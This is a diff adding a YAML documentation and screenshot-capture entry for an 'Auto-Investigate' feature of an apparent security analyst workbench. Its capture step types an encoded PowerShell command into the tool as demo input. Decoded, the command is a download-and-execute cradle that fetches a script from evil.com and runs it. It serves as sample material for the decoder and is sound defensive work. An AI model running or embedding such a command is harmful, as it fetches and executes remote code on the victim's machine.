@@ -1,0 +1,31 @@
+id: auto_investigate
+title: Auto-Investigate
+category: Analyst Workbench
+audience: user
+purpose: Chain the deterministic decoder + reasoning engine + threat-intel + MITRE
+  mapper into a one-click investigation.
+when_to_use:
+- Triaging a large volume of alerts
+- Any time you would run the same decoding + enrichment steps manually
+tips:
+- Combine with the Candidate Explorer when the auto-verdict is ambiguous
+- Results land on the Investigation Timeline for later replay
+related:
+- candidate_explorer
+- threat_intel_enrichment
+- investigation_timeline
+capture:
+  login: true
+  steps:
+  - url: /workspace
+    wait_for: '[data-testid="input-textarea"]'
+    type_into:
+      selector: '[data-testid="input-textarea"]'
+      text: powershell.exe -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+    click_before: '[data-testid="btn-auto-investigate-inline"]'
+    delay_ms: 4000
+    post_click_ms: 6000
+    selectors:
+    - '[data-testid="input-card"]'
+    - '[data-testid="output-card"]'
+    - '[data-testid="threat-analysis-panel"]'
